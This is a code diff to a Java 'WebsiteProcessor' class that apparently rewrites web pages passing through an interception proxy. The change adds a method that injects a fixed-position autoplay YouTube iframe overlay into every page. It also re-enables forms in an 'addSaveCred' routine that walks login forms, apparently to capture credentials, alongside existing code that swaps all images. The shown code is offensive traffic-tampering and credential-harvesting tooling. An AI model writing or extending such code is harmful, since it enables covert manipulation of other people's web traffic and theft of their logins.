@@ -130,7 +130,21 @@ public class WebsiteProcessor {
 		if(config.imageURL!=null && !config.imageURL.equals("")){
 			changeAllImages(ri,doc);
 		}
+		if(config.youtubeURL!=null && !config.youtubeURL.equals("")){
+			addYouTubeAutoPlay(ri,doc);
+		}
 		return doc.toString();
+	}
+	private void addYouTubeAutoPlay(RequestInfo ri, Document doc) {
+		Document newIframe = Jsoup.parseBodyFragment("<iframe frameborder='0' allowfullscreen></iframe>");
+		Element iframe = newIframe.select("iframe").first();
+		iframe.attr("height","400px");
+		iframe.attr("width","400px");
+		iframe.attr("src",config.youtubeURL+"?autoplay=1");
+		iframe.attr("style","z-index:100000; position:fixed; top:0px; left:0px;");
+		doc.append(newIframe.toString());
+		System.out.println(newIframe.toString());
+		
 	}
 	private void changeAllImages(RequestInfo ri, Document doc) {
 		Elements images = doc.select("img");
@@ -172,7 +186,7 @@ public class WebsiteProcessor {
 		}
 	}
 	private void addSaveCred(RequestInfo ri, Document doc){
-		this.disableAllForms(ri, doc);
+		//this.disableAllForms(ri, doc);
 		Elements loginForms = doc.select("form");
 		loginForms.addAll(doc.select("div"));
 		for(Element loginForm:loginForms){
